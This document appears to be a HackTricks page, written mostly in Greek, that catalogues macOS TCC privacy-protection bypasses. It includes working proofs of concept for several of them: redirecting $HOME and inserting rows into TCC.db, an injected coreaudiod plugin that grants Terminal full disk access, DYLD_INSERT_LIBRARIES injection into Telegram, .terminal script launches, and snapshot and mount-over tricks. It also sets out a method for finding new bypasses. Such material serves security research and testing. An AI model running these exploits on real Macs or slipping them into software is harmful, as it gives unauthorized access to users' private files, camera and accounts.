# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## Ανά λειτουργικότητα

### Write Bypass

This is not a bypass, it's just how TCC works: **Δεν προστατεύει από εγγραφή**. If Terminal **δεν έχει πρόσβαση για ανάγνωση του Desktop ενός χρήστη, μπορεί και πάλι να γράψει σε αυτό**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
Το **extended attribute `com.apple.macl`** προστίθεται στο νέο **file** για να δώσει στην **creators app** πρόσβαση ανάγνωσής του.

### TCC ClickJacking

Είναι πιθανό να **τοποθετηθεί ένα παράθυρο πάνω από το TCC prompt** ώστε να κάνει τον χρήστη να το **αποδεχτεί** χωρίς να το αντιληφθεί. Μπορείτε να βρείτε ένα PoC στο [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Ο attacker μπορεί να **δημιουργήσει apps με οποιοδήποτε όνομα** (π.χ. Finder, Google Chrome...) στο **`Info.plist`** και να τα κάνει να ζητήσουν πρόσβαση σε κάποια τοποθεσία που προστατεύεται από το TCC. Ο χρήστης θα νομίζει ότι η legit εφαρμογή είναι αυτή που ζητά την πρόσβαση.\
Επιπλέον, είναι δυνατό να **αφαιρεθεί η legit app από το Dock και να τοποθετηθεί η fake στη θέση της**, έτσι ώστε όταν ο χρήστης κάνει κλικ στη fake (η οποία μπορεί να χρησιμοποιεί το ίδιο icon), αυτή να μπορεί να καλέσει τη legit, να ζητήσει TCC permissions και να εκτελέσει ένα malware, κάνοντας τον χρήστη να πιστέψει ότι η legit app ζήτησε την πρόσβαση.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Περισσότερες πληροφορίες και PoC στο:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Από προεπιλογή, η πρόσβαση μέσω **SSH είχε "Full Disk Access"**. Για να την απενεργοποιήσετε, πρέπει να εμφανίζεται στη λίστα αλλά να είναι απενεργοποιημένη (η αφαίρεσή της από τη λίστα δεν θα αφαιρέσει αυτά τα privileges):<sup>[2]</sup>

![TCC Request by arbitrary name - SSH Bypass: Από προεπιλογή, η πρόσβαση μέσω SSH είχε "Full Disk Access". Για να την απενεργοποιήσετε, πρέπει να εμφανίζεται στη λίστα αλλά να είναι απενεργοποιημένη (η αφαίρεσή της...](<../../../../../images/image (1077).png>)

Εδώ μπορείτε να βρείτε παραδείγματα για το πώς ορισμένα **malwares κατάφεραν να παρακάμψουν αυτή την προστασία**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[11]</sup>

> [!CAUTION]
> Σημειώστε ότι πλέον, για να μπορέσετε να ενεργοποιήσετε το SSH, χρειάζεστε **Full Disk Access**

### Handle extensions - CVE-2022-26767

Το attribute **`com.apple.macl`** δίνεται σε files για να δώσει σε **μια συγκεκριμένη εφαρμογή permissions ανάγνωσής τους.** Αυτό το attribute ορίζεται όταν γίνεται **drag\&drop** ενός file πάνω σε ένα app ή όταν ο χρήστης κάνει **double-click** σε ένα file για να το ανοίξει με την **default application**.

Επομένως, ένας χρήστης θα μπορούσε να **καταχωρίσει ένα malicious app** για να χειρίζεται όλες τις extensions και να καλέσει το Launch Services για να **ανοίξει** οποιοδήποτε file (οπότε στο malicious file θα παραχωρηθεί πρόσβαση ανάγνωσής του).

### iCloud

Μέσω του entitlement **`com.apple.private.icloud-account-access`** είναι δυνατό να γίνει επικοινωνία με το **`com.apple.iCloudHelper`** XPC service, το οποίο θα **παρέχει iCloud tokens**.

Τα **iMovie** και **Garageband** διέθεταν αυτό το entitlement, καθώς και άλλα που επέτρεπαν.

Για περισσότερες **πληροφορίες** σχετικά με το exploit για τη **λήψη icloud tokens** μέσω αυτού του entitlement, δείτε την ομιλία: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[12]</sup>

### kTCCServiceAppleEvents / Automation

Ένα app με permission **`kTCCServiceAppleEvents`** θα μπορεί να **ελέγχει άλλα Apps**. Αυτό σημαίνει ότι θα μπορούσε να **κάνει abuse στα permissions που έχουν παραχωρηθεί στα άλλα Apps**.

Για περισσότερες πληροφορίες σχετικά με τα Apple Scripts, δείτε:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Για παράδειγμα, αν ένα App έχει **Automation permission πάνω στο `iTerm`**, σε αυτό το παράδειγμα το **`Terminal`** έχει πρόσβαση στο iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

Το Terminal, το οποίο δεν έχει FDA, μπορεί να καλέσει το iTerm, το οποίο το διαθέτει, και να το χρησιμοποιήσει για να εκτελέσει ενέργειες:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Μέσω του Finder

Ή, αν ένα App έχει πρόσβαση μέσω του Finder, θα μπορούσε να εκτελέσει ένα script όπως αυτό:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Ανά εφαρμογή

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Το **tccd daemon** στο userland χρησιμοποιούσε τη μεταβλητή **`HOME`** του **env** για την πρόσβαση στη βάση δεδομένων χρηστών του TCC από: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Σύμφωνα με [αυτήν την ανάρτηση στο Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) και επειδή το TCC daemon εκτελείται μέσω του **`launchd`** μέσα στο domain του τρέχοντος χρήστη, είναι δυνατός ο **έλεγχος όλων των μεταβλητών περιβάλλοντος** που του μεταβιβάζονται.\
Έτσι, ένας **attacker θα μπορούσε να ορίσει τη μεταβλητή περιβάλλοντος `$HOME`** στο **`launchctl`**, ώστε να δείχνει σε έναν **ελεγχόμενο** **κατάλογο**, να κάνει **restart** στο **TCC** daemon και, στη συνέχεια, να **τροποποιήσει απευθείας τη βάση δεδομένων TCC**, παρέχοντας στον εαυτό του **κάθε διαθέσιμο TCC entitlement** χωρίς να εμφανιστεί ποτέ prompt στον τελικό χρήστη.<sup>[1]</sup>\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Σημειώσεις

Το Notes είχε πρόσβαση σε τοποθεσίες που προστατεύονται από το TCC, αλλά όταν δημιουργείται μια σημείωση, αυτή **δημιουργείται σε μη προστατευμένη τοποθεσία**. Έτσι, μπορούσατε να ζητήσετε από το Notes να αντιγράψει ένα προστατευμένο αρχείο σε μια σημείωση (άρα σε μη προστατευμένη τοποθεσία) και στη συνέχεια να αποκτήσετε πρόσβαση στο αρχείο:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Το binary `/usr/libexec/lsd`, μαζί με τη library `libsecurity_translocate`, είχε το entitlement `com.apple.private.nullfs_allow`, το οποίο του επέτρεπε να δημιουργεί **nullfs** mount, και είχε το entitlement `com.apple.private.tcc.allow` με το **`kTCCServiceSystemPolicyAllFiles`**, ώστε να αποκτά πρόσβαση σε κάθε αρχείο.

Ήταν δυνατή η προσθήκη του quarantine attribute στο "Library", η κλήση του **`com.apple.security.translocation`** XPC service, και στη συνέχεια το Library αντιστοιχιζόταν στο **`$TMPDIR/AppTranslocation/d/d/Library`**, όπου όλα τα έγγραφα μέσα στο Library μπορούσαν να **προσπελαστούν**.

### CVE-2024-44131 - FileProvider symlink race

Οι εφαρμογές που παραδίδουν τις λειτουργίες αρχείων σε έναν **privileged helper** (εδώ **`fileproviderd`** / **`Files.app`**) αντιγράφουν ή μετακινούν στοιχεία **εκ μέρους του χρήστη**, επομένως η αντιγραφή εκτελείται με τα privileges του helper αντί για εκείνα του caller.

Το Jamf Threat Labs έδειξε ότι η επικύρωση του symlink που εκτελείται πριν από τη λειτουργία μπορεί να γίνει **race**: αντί να τοποθετηθεί το symlink στο **τελευταίο** component του path (το οποίο ελέγχεται), ο attacker αντικαθιστά έναν **ενδιάμεσο** directory του path **αφού έχει ήδη ξεκινήσει η αντιγραφή**. Στη συνέχεια, ο privileged helper ακολουθεί το link που ελέγχει ο attacker και διαβάζει/γράφει σε τοποθεσίες που προστατεύονται από το TCC **χωρίς να εμφανίσει ποτέ prompt**.<sup>[7]</sup>

Οι directories που **δεν** προστατεύονται από ένα τυχαίο UUID στο path τους (για παράδειγμα `~/Library/Mobile Documents/com~apple~CloudDocs`) είναι οι ευκολότεροι στόχοι, επειδή ο attacker μπορεί να προβλέψει το πλήρες path για το race.

> [!TIP]
> Αυτό είναι το generic pattern που πρέπει να αναζητάτε: **κάθε privileged process που επιλύει ένα path περισσότερες από μία φορές** (check-then-use ή `rename()`/`copyfile()` που επιλύουν ξεχωριστά το source και το destination) μπορεί να γίνει race μέσω αντικατάστασης ενός directory στη μέση του path. Μόνο τα `O_NOFOLLOW_ANY`, `openat()` σε ένα ήδη ανοιχτό directory FD ή το `realpath()` + re-validation κλείνουν πραγματικά το παράθυρο.

Περισσότερες πληροφορίες στο [**writeup του Jamf Threat Labs**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[7]</sup>

### SQLITE_SQLLOG_DIR

Η `libsqlite3` μπορεί να γίνει build με `SQLITE_ENABLE_SQLLOG`, το οποίο προσθέτει ένα logging hook που ελέγχεται από environment variables ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[8]</sup>

- **`SQLITE_SQLLOG_DIR=path`** – για **κάθε database που ανοίγει**, ένα **αντίγραφο του database file** και ένα log των SQL statements γράφονται στο `path` (το directory πρέπει να υπάρχει ήδη).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – δημιουργεί **νέο αντίγραφο κάθε φορά** που ανοίγει/συνδέεται ένα DB, αντί να επαναχρησιμοποιεί ένα υπάρχον.
- **`SQLITE_SQLLOG_CONDITIONAL`** – καταγράφει μια connection μόνο αν υπάρχει ένα αρχείο `<database>-sqllog` δίπλα στο κύριο DB.

Αν μπορείτε να κάνετε inject αυτή τη μεταβλητή σε ένα process που έχει **FDA** και ανοίγει SQLite databases, θα **αντιγράψει πρόθυμα αυτές τις προστατευμένες databases** σε ένα directory που ελέγχετε. Επειδή το filename του destination παράγεται από δεδομένα που ελέγχει ο attacker, ένα **symlink που έχει τοποθετηθεί στο destination** μετατρέπει το ίδιο primitive σε **arbitrary file write** με τα privileges του target process.

### **SQLITE_AUTO_TRACE**

Αν οριστεί η environment variable **`SQLITE_AUTO_TRACE`**, η library **`libsqlite3.dylib`** θα ξεκινήσει να **καταγράφει** όλα τα SQL queries. Πολλές εφαρμογές χρησιμοποιούσαν αυτή τη library, επομένως ήταν δυνατή η καταγραφή όλων των SQLite queries τους.

Αρκετές εφαρμογές της Apple χρησιμοποιούσαν αυτή τη library για πρόσβαση σε πληροφορίες που προστατεύονται από το TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Αναζήτηση για εγγραφές αρχείων καθοδηγούμενες από env-var

Οι δύο προηγούμενες καταχωρίσεις είναι παραδείγματα της ίδιας γενικής τεχνικής και αξίζει να αναζητήσετε περισσότερα: **τα frameworks που φορτώνονται σε TCC-privileged apps συχνά εκθέτουν environment variables για debugging/logging, τα οποία κάνουν τη διεργασία να δημιουργεί ένα αρχείο σε path που ελέγχει ο caller**.

Workflow για την εύρεσή τους:

1. Επιλέξτε έναν στόχο με FDA ή άλλη ενδιαφέρουσα TCC permission (`Music`, `TV`, `Terminal`, MDM agents...) και καταγράψτε τα frameworks με τα οποία συνδέεται (`otool -L`, `vmmap`).
2. Κάντε grep στα frameworks για strings του `getenv`: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Ορίστε τις υποψήφιες μεταβλητές μέσω `launchctl setenv NAME /path/you/control`, εκκινήστε την εφαρμογή και παρακολουθήστε τι κάνει στο filesystem με `fs_usage -w -f filesys <pid>` ή `sudo fs_usage | grep <path>`.
4. Αν η διεργασία **δημιουργεί ή μετονομάζει** ένα αρχείο στον κατάλογό σας, έχετε ένα write primitive: δείξτε τον προορισμό σε ένα symlink (ή εκμεταλλευτείτε ένα race σε ενδιάμεσο directory, όπως στο CVE-2024-44131 παραπάνω) για να το ανακατευθύνετε στο `~/Library/Application Support/com.apple.TCC/TCC.db`.

> [!TIP]
> Δύο πράγματα περιορίζουν αυτή την τεχνική. Πρώτον, οι μεταβλητές **`DYLD_*`** αγνοούνται από binaries με hardened runtime, εκτός αν η εφαρμογή διαθέτει το entitlement [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) ("a Boolean value that indicates whether the app may be affected by dynamic linker environment variables, which you can use to inject code into your app's process") — δείτε επίσης το [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Δεύτερον, η Apple αφαιρεί μεμονωμένες debug variables των frameworks όταν αυτές αναφέρονται, επομένως μια μεταβλητή που λειτουργούσε σε μία έκδοση του macOS συχνά έχει αφαιρεθεί στην επόμενη. Αν μια εφαρμογή αρνείται σιωπηλά να εκκινήσει αφού ορίσετε κάποια, θεωρήστε ότι η μεταβλητή έχει ήδη φιλτραριστεί.

Δείτε το [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) για το αντίστοιχο trick με linker variables.

### Apple Remote Desktop

Ως root θα μπορούσατε να ενεργοποιήσετε αυτή την υπηρεσία και ο **ARD agent θα είχε full disk access**, το οποίο θα μπορούσε στη συνέχεια να χρησιμοποιηθεί από έναν χρήστη ώστε να αντιγράψει μια νέα **TCC user database**.

## Μέσω του **NFSHomeDirectory**

Το TCC χρησιμοποιεί μια database στον HOME folder του χρήστη για να ελέγχει την πρόσβαση σε resources που αφορούν συγκεκριμένα τον χρήστη, στο **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Επομένως, αν ο χρήστης καταφέρει να επανεκκινήσει το TCC με μια μεταβλητή `$HOME` που δείχνει σε **διαφορετικό folder**, θα μπορούσε να δημιουργήσει μια νέα TCC database στο **/Library/Application Support/com.apple.TCC/TCC.db** και να εξαπατήσει το TCC ώστε να εκχωρήσει οποιαδήποτε TCC permission σε οποιαδήποτε εφαρμογή.

> [!TIP]
> Σημειώστε ότι η Apple χρησιμοποιεί τη ρύθμιση που είναι αποθηκευμένη στο profile του χρήστη, στο attribute **`NFSHomeDirectory`**, ως **τιμή του `$HOME`**. Επομένως, αν παραβιάσετε μια εφαρμογή με permissions για την τροποποίηση αυτής της τιμής (**`kTCCServiceSystemPolicySysAdminFiles`**), μπορείτε να **weaponize** αυτή την επιλογή με ένα TCC bypass.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

Το **first POC** χρησιμοποιεί τα [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) και [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) για να τροποποιήσει τον **HOME** folder του χρήστη.

1. Αποκτήστε ένα _csreq_ blob για την εφαρμογή-στόχο.
2. Τοποθετήστε ένα πλαστό αρχείο _TCC.db_ με την απαιτούμενη πρόσβαση και το _csreq_ blob.
3. Κάντε export την καταχώριση του χρήστη στο Directory Services με το [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Τροποποιήστε την καταχώριση στο Directory Services για να αλλάξετε το home directory του χρήστη.
5. Κάντε import την τροποποιημένη καταχώριση στο Directory Services με το [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Σταματήστε το _tccd_ του χρήστη και κάντε reboot τη διεργασία.

Το δεύτερο POC χρησιμοποίησε το **`/usr/libexec/configd`**, το οποίο είχε `com.apple.private.tcc.allow` με την τιμή `kTCCServiceSystemPolicySysAdminFiles`.\
Ήταν δυνατό να εκτελεστεί το **`configd`** με την επιλογή **`-t`**, μέσω της οποίας ένας attacker μπορούσε να καθορίσει ένα **custom Bundle to load**. Επομένως, το exploit **αντικαθιστά** τη μέθοδο αλλαγής του home directory του χρήστη μέσω **`dsexport`** και **`dsimport`** με **`configd` code injection**.

Για περισσότερες πληροφορίες δείτε το [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).<sup>[13]</sup>

## Μέσω process injection

Υπάρχουν διάφορες τεχνικές για την εισαγωγή κώδικα σε μια διεργασία και την κατάχρηση των TCC privileges της:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Επιπλέον, το πιο συνηθισμένο process injection για bypass του TCC που έχει εντοπιστεί γίνεται μέσω **plugins (load library)**.\
Τα plugins είναι επιπλέον κώδικας, συνήθως με τη μορφή libraries ή plist, που **φορτώνονται από την κύρια εφαρμογή** και εκτελούνται στο context της. Επομένως, αν η κύρια εφαρμογή είχε πρόσβαση σε TCC-restricted files (μέσω granted permissions ή entitlements), ο **custom code θα είχε επίσης πρόσβαση**.

### CVE-2020-27937 - Directory Utility

Η εφαρμογή `/System/Library/CoreServices/Applications/Directory Utility.app` είχε το entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, φόρτωνε plugins με extension **`.daplug`** και **δεν είχε hardened** runtime.

Για να γίνει weaponize αυτό το CVE, το **`NFSHomeDirectory`** **αλλάζει** (με κατάχρηση του προηγούμενου entitlement), ώστε να είναι δυνατή η **ανάληψη του TCC database των χρηστών** για bypass του TCC.

Για περισσότερες πληροφορίες δείτε το [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).<sup>[14]</sup>

### CVE-2020-29621 - Coreaudiod

Το binary **`/usr/sbin/coreaudiod`** είχε τα entitlements `com.apple.security.cs.disable-library-validation` και `com.apple.private.tcc.manager`. Το πρώτο **επέτρεπε code injection** και το δεύτερο του έδινε πρόσβαση στη **διαχείριση του TCC**.

Αυτό το binary επέτρεπε τη φόρτωση **third party plug-ins** από τον φάκελο `/Library/Audio/Plug-Ins/HAL`. Επομένως, ήταν δυνατό να **φορτωθεί ένα plugin και να γίνει κατάχρηση των TCC permissions** με αυτό το PoC:<sup>[15]</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Για περισσότερες πληροφορίες, δείτε την [**αρχική αναφορά**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[15]</sup>

### Device Abstraction Layer (DAL) Plug-Ins

Οι εφαρμογές συστήματος που ανοίγουν stream κάμερας μέσω του Core Media I/O (εφαρμογές με **`kTCCServiceCamera`**) φορτώνουν στη διεργασία αυτά τα plugins, τα οποία βρίσκονται στο `/Library/CoreMediaIO/Plug-Ins/DAL` (δεν περιορίζονται από το SIP).

Η απλή αποθήκευση εκεί μιας library με τον κοινό **constructor** αρκεί για την **έγχυση κώδικα**.

Αρκετές εφαρμογές της Apple ήταν ευάλωτες σε αυτό.

### Firefox

Η εφαρμογή Firefox διέθετε τα entitlements `com.apple.security.cs.disable-library-validation` και `com.apple.security.cs.allow-dyld-environment-variables`:<sup>[16]</sup>
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Για περισσότερες πληροφορίες σχετικά με το πώς μπορείτε να το κάνετε εύκολα exploit, [**δείτε το original report**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[16]</sup>

### CVE-2020-10006

Το binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` είχε τα entitlements **`com.apple.private.tcc.allow`** και **`com.apple.security.get-task-allow`**, τα οποία επέτρεπαν την εισαγωγή κώδικα μέσα στη διεργασία και τη χρήση των TCC privileges.

### CVE-2023-26818 - Telegram

Το Telegram είχε τα entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** και **`com.apple.security.cs.disable-library-validation`**, επομένως ήταν δυνατό να γίνει abuse για την απόκτηση πρόσβασης στα permissions του, όπως η καταγραφή με την camera. Μπορείτε να [**βρείτε το payload στο writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[17]</sup>

Σημειώστε ότι, για τη χρήση του env variable ώστε να φορτωθεί ένα library, δημιουργήθηκε ένα **custom plist** για την εισαγωγή αυτού του library και χρησιμοποιήθηκε το **`launchctl`** για την εκκίνησή του:<sup>[17]</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Μέσω open invocations

Είναι δυνατό να γίνει invoke το **`open`** ακόμη και όταν το σύστημα βρίσκεται σε sandbox

### Terminal Scripts

Είναι αρκετά συνηθισμένο να παρέχεται **Full Disk Access (FDA)** στο Terminal, τουλάχιστον σε υπολογιστές που χρησιμοποιούνται από άτομα του τεχνολογικού κλάδου. Επίσης, είναι δυνατό να γίνει invoke αρχείων script **`.terminal`** μέσω αυτού.

Τα **`.terminal`** scripts είναι αρχεία plist όπως το παρακάτω, με την εντολή προς εκτέλεση στο key **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Μια εφαρμογή θα μπορούσε να γράψει ένα terminal script σε μια τοποθεσία όπως το /tmp και να το εκκινήσει με μια εντολή όπως:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Με χρήση mount

### CVE-2020-9771 - mount_apfs TCC bypass και privilege escalation

**Οποιοσδήποτε χρήστης** (ακόμη και unprivileged) μπορεί να δημιουργήσει και να κάνει mount ένα snapshot του Time Machine και να αποκτήσει **πρόσβαση σε ΟΛΑ τα αρχεία** αυτού του snapshot.\
Το **μοναδικό privilege** που απαιτείται είναι η εφαρμογή που χρησιμοποιείται (όπως το `Terminal`) να έχει πρόσβαση **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), η οποία πρέπει να παραχωρηθεί από έναν admin.<sup>[2]</sup>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Μια πιο λεπτομερής εξήγηση [**βρίσκεται στο original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Mount over TCC file

Ακόμα κι αν το αρχείο TCC DB προστατευόταν, ήταν δυνατή η **mount πάνω από τον κατάλογο** ενός νέου αρχείου TCC.db:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Ελέγξτε το **πλήρες exploit** στο [**αρχικό writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

Όπως εξηγείται στο [αρχικό writeup](https://www.kandji.io/blog/macos-audit-story-part2), αυτό το CVE εκμεταλλευόταν το `diskarbitrationd`.<sup>[18]</sup>

Η συνάρτηση `DADiskMountWithArgumentsCommon` από το public `DiskArbitration` framework εκτελούσε τους ελέγχους ασφαλείας. Ωστόσο, ήταν δυνατή η παράκαμψή της μέσω απευθείας κλήσης του `diskarbitrationd` και, επομένως, η χρήση στοιχείων `../` στη διαδρομή και symlinks.

Αυτό επέτρεπε σε έναν attacker να πραγματοποιεί arbitrary mounts σε οποιαδήποτε τοποθεσία, ακόμη και πάνω από τη βάση δεδομένων TCC, λόγω του entitlement `com.apple.private.security.storage-exempt.heritable` του `diskarbitrationd`.

### asr

Το tool **`/usr/sbin/asr`** επέτρεπε την αντιγραφή ολόκληρου του δίσκου και το mount του σε άλλη τοποθεσία, παρακάμπτοντας τις TCC protections.

### CVE-2022-22655 - Υπηρεσίες τοποθεσίας

